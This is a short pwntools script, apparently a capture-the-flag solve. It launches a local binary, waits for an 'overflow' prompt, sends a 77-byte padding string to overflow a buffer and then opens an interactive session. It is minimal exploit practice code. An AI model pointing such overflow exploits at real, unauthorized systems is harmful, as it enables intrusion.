#!/usr/bin/python2
from pwn import *
import sys


p = process(sys.argv[1])

p.recvuntil("overflow")
p.sendline("a" * 77)
p.interactive()
